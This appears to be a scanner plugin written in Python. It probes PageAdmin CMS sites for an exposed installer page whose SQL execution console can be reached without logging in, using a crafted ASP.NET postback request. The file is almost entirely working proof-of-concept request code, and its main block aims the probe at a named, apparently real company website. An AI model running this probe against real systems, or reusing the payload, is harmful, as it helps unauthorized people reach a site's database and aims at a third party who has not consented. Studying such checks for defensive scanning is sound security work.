#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2014-061699

def assign(service, arg):
    if service == 'pageadmin':
        return True, arg

def audit(arg):
    payload = 'e/install/index.aspx'
    target = arg + payload
    code, head, res, errcode, final_url = curl.curl2(target)
    if code == 200 and 'install.lock'in res:
        payload = 'e/install/index.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExODcwMDU5OTgPZBYCAgEPZBYCAgMPFgIeB1Zpc2libGVoZGQ%3D&ctl02=%E8%BF%90%E8%A1%8CSQ'
        target = arg + payload
        code, head, res, errcode, final_url = curl.curl2(target)
        if code == 200 and '<textarea name="Tb_sql"'in res:  
            security_warning(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('pageadmin', 'http://aikang-medical.com/')[1])